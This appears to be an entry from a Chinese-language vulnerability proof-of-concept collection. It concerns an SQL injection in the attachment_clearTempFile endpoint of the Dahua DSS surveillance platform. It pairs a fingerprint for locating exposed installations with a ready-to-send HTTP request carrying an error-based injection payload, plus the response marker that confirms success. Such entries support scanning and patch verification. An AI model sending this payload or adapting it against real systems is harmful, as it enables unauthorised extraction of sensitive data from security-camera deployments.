﻿# 大华DSS监控系统 attachment_clearTempFile SQL注入漏洞

> 更新时间：2024-03-23

> 漏洞编号：

> 漏洞说明：DSS数字监控系统是在通用的安防视频监控系统的基础上进行设计开发，除了普通安防视频监控所共有的实时监视、云台操作、录像回放、报警处理、设备管理等功能外，更多地考虑到如何方便用户使用系统的人机工程。其接口attachment_clearTempFile存在sql注入漏洞，攻击者可通过报错注入获取数据库敏感信息。

> 漏洞特征：body="include/script/dahuaDefined/"

> 验证脚本：HTTP

```
GET /portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(1,concat(0x7e,md5(1),0x7e))%20or%20(%2799%27=%2799&bean.TabName=1 HTTP/1.1
Accept: */*
Connection: close
```

> 响应代码特征：200

> 响应内容特征：a0b923820

> 上传文件定位：

> 验证文件来源：大华DSS监控系统 attachment_clearTempFile SQL注入漏洞.poc

